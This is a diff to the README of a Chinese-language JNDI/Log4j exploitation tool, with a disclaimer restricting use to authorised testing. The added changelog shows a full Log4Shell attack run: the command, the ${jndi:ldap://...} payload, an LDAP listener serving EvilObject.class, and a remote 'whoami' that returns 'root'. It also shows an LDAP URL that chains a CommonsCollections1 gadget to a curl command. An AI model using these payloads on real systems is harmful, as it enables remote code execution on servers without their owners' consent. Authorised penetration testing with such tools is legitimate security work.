@@ -1,4 +1,4 @@
-# fastjson_rce_tool
+# jndi_tool
 
 ```
 声明： 此工具仅用于企业安全人员自查验证自身企业资产的安全风险，或有合法授权的安全测试，请勿用于其他用途，如有，后果自负。
@@ -27,6 +27,16 @@ java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx  
 
 2021-12-14日志
 1. 新增log4j的一些场景
+> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 80 "whoami" http://xx.xx.xx:8080/
+[-] payload:  ${jndi:ldap://xx.xx.xx.xx/x}
+[-] LDAP Listening on 0.0.0.0:80
+[*] Have connection from /xx.xx.xx.xx:34850 /EvilObject.class
+[-] remote target jdk version: java/1.8.0_131, use payload version: jdk8
+[-] send payload done
+[-] waiting result...
+result: 
+root
+
 2. 优化 jndi.LDAPRefServer，支持gadget/command形式，例如 ldap://xx.xx.xx.xx:1099/CommonsCollections1/curl x.com"
 
 
